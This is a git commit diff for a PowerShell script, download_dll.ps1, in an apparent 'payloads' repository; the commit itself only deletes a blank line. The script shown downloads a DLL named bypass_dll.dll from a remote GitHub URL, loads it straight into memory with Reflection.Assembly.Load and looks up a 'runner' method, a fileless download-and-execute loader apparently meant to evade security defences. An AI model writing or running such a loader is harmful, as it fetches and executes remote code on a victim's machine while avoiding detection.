07138cd0162ba20c62fa0898f819fcb16d73fff7
far-light <50488233+far-light@users.noreply.github.com>
2021-12-24 01:03:24 +0300

    Update download_dll.ps1

--- download_dll.ps1
+++ download_dll.ps1
@@ -1,5 +1,4 @@
 $data = (New-Object System.Net.WebClient).DownloadData('https://github.com/far-light/payloads/raw/main/bypass_dll.dll')
-
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
